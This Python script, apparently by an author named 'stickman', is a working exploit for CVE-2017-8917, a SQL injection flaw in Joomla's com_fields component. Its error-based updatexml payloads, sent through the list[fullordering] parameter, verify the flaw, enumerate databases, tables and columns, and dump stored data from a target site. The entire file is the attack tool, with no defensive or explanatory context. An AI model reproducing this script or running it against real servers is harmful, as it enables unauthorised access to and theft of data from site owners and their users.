import requests
import argparse
from lxml import etree
import re
# Author : stickman

def toHex(strs):
	hexs="0x"
	for i in range(len(strs)):
		hexs+=hex(ord(strs[i])).split("x")[1]
	return hexs


def verify(url):
	payload=url+"?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)"
	response=requests.get(payload)
	if "XPATH syntax error" in response.text:
		print("the CVE-2017-8917 has been verified")
		exit(1)
	print("the CVE-2017-8917 is non-existent")
	exit(1)

def brust_databses(url):
	payload=str(url)+'?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(0x7e,(select schema_name from information_schema.schemata limit {'+'},1),0x7e),1)'
	flag=0
	while True:
		response=requests.get(payload.format(flag))
		if "XPATH syntax error" in response.text:
			con=etree.HTML(response.text)
			value=re.findall(r'XPATH syntax error: \'~(.*)~',con.xpath("//blockquote/text()")[1])[0]
			print("database name: ",value)
			flag+=1
		else:
			break
	exit(1)

def brust_tables(url,schema):
	payload=url+"?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(0x7e,(select table_name from information_schema.tables where table_schema={} limit {},1),0x7e),1)"
	flag=0
	schema=toHex(schema)
	while True:
		response=requests.get(payload.format(schema,flag))
		if "XPATH syntax error" in response.text:
			con=etree.HTML(response.text)
			value=re.findall(r'XPATH syntax error: \'~(.*)~',con.xpath("//blockquote/text()")[1])[0]
			print("table name: ",value)
			flag+=1
		else:
			break
	exit(1)

def brust_columns(url,schema,table):
	payload=url+"?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(0x7e,(select column_name from information_schema.columns where table_schema={} and table_name={} limit {},1),0x7e),1)"
	flag=0
	schema=toHex(schema)
	table=toHex(table)
	while True:
		response=requests.get(payload.format(schema,table,flag))
		if "XPATH syntax error" in response.text:
			con=etree.HTML(response.text)
			value=re.findall(r'XPATH syntax error: \'~(.*)~',con.xpath("//blockquote/text()")[1])[0]
			print("column name: ",value)
			flag+=1
		else:
			break
	exit(1)

def brust_data(url,table,column):
	payload=url+"?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(0x7e,(select substring((select {} from {}),{})),0x7e),1)"
	flag=0
	while True:
		if flag==0:
			response=requests.get(payload.format(column,table,1))
		else:
			response=requests.get(payload.format(column,table,flag*32))
		if "XPATH syntax error" in response.text:
			con=etree.HTML(response.text)
			value=re.findall(r'XPATH syntax error: \'(.*)\'',con.xpath("//blockquote/text()")[1])[0].strip("~")
			if value=='':
				break
			else:
				print("data: ",value)
				flag+=1
		else:
			break
	exit(1)		

if __name__=='__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-u',"--uri")
	parser.add_argument('-U',"--URI")	
	parser.add_argument('-d',"--database")
	parser.add_argument('-D',"--DATABASE",action="store_true")
	parser.add_argument('-t',"--table")
	parser.add_argument('-T',"--TABLE",action="store_true")
	parser.add_argument('-c',"--column")
	parser.add_argument('-C',"--COLUMN",action="store_true")
	parser.add_argument('-P',"--dump",action="store_true")	
	args = parser.parse_args()
	if args.uri==None and args.URI==None:
		parser.print_usage()
		exit(1)
	else:
		print("*************start attack!*************")
		if args.URI!=None:
			verify(args.URI)
		if args.DATABASE!=False:
			brust_databses(args.uri)
		if args.TABLE!=False:
			brust_tables(args.uri,args.database)
		if args.COLUMN!=False:
			brust_columns(args.uri,args.database,args.table)
		if args.dump!=False:
			brust_data(args.uri,args.table,args.column)




